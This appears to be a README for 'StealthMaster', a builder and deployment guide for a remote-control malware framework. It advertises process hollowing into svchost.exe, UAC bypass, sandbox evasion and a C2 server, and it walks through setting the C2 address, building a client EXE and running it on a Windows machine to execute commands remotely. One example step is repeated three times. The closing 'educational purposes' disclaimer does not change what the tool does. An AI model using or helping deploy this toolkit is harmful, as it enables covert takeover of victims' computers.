# StealthMaster

A professional-grade tool with a GUI for editing, building, and deploying a gRPC-based client-server system. This project includes a client (`StealthMaster`) and a server with bidirectional streaming capabilities, designed for high stealth, stability, and performance.

## Features
- **GUI**: Edit client and server code, save changes, build EXE, run the server, and test server connection with a modern dark theme.
- **gRPC**: Secure and fast communication with bidirectional streaming.
- **Stealth**: Process hollowing into `svchost.exe`, fileless execution, and sandbox detection.
- **UAC Bypass**: SilentCleanup and EventVwr techniques.
- **Stability**: Watchdog system for crash recovery.

## Prerequisites
- Python 3.8+
- Git
- Windows (for client features like UAC bypass and process hollowing)

## Installation

1. **Clone the Repository**
   ```bash
   git clone https://github.com/yourusername/StealthMaster.git
   cd StealthMaster
   
2. **Install Dependencies**
    ```bash
   pip install grpcio grpcio-tools cryptography pywin32 tkinter pyinstaller

3. **Generate gRPC Files**
   ```bash 
   python -m grpc_tools.protoc -Iprotos --python_out=generated --grpc_python_out=generated protos/command.proto
   
4. **Generate SSL Certificates**
   ```bash
   openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
   

## Usage
1.**Running the GUI**
   ```bash 
   python gui_app.py
   ```
   - Client Editor: Edit client_template.py, save changes, and click "Build Client EXE" to create an executable.
   - Server Editor: Edit server_template.py, save changes, and click "Run Server" to start the server locally.

## Deploying the Server Online
1. **Get a VPS (e.g., DigitalOcean, AWS):**
   - Rent a VPS with Ubuntu.
   - SSH into it: ssh user@your-vps-ip.
2. **Deploying the Server Online**
   ```bash
   sudo apt update
   sudo apt install python3 python3-pip
   pip3 install grpcio grpcio-tools cryptography
   
3. **Install Dependencies on VPS**
   - Upload server_template.py, server.crt, server.key, generated/command_pb2.py, and generated/command_pb2_grpc.py via SCP:
   ```bash 
   scp server_template.py user@your-vps-ip:/home/user/
   scp server.crt server.key generated/* user@your-vps-ip:/home/user/
4. **Run the Server**
   ```bash
   python3 server_template.py
5. **Update Client**
   - Edit C2_SERVER in client_template.py to your VPS IP or domain (e.g., my-server.com:443).

6. **Open Port 443**
   ```bash
   sudo ufw allow 443

## Example
1. **Run the GUI: python gui_app.py.**
2. **Edit client_template.py, change C2_SERVER to my-server.com:443, and save.**
3. **Click "Build Client EXE" to generate dist/client_template.exe.**
4. **Click "Build Client EXE" to generate dist/client_template.exe.**
5. **Click "Build Client EXE" to generate dist/client_template.exe.**
6. **Deploy server_template.py on a VPS and run it.**
7. **Run the EXE on a Windows machine—it connects to the server and executes commands.**

### This project is for educational purposes only. No warranty is provided. Use at your own risk.